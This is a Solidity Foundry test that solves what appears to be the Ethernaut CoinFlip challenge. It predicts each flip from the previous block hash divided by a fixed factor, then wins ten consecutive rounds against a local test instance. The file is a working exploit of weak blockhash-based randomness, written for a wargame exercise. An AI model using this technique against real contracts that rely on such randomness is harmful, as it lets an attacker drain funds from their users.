// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {CoinFlip} from "../src/03_CoinFlip.sol";

contract TestCoinFlip is Test {
    address public player = address(0xbad);
    CoinFlip public instance;

    function setUp() public {
        instance = new CoinFlip();
        vm.deal(player, 0.001 ether);
    }

    function testSolution() public {
        vm.startPrank(player);

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        for (uint8 i; i < 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            bool side = blockValue / FACTOR == 1;
            instance.flip(side);
            vm.roll(block.number + 1);
        }

        assertGe(instance.consecutiveWins(), 10);

        vm.stopPrank();
    }
}
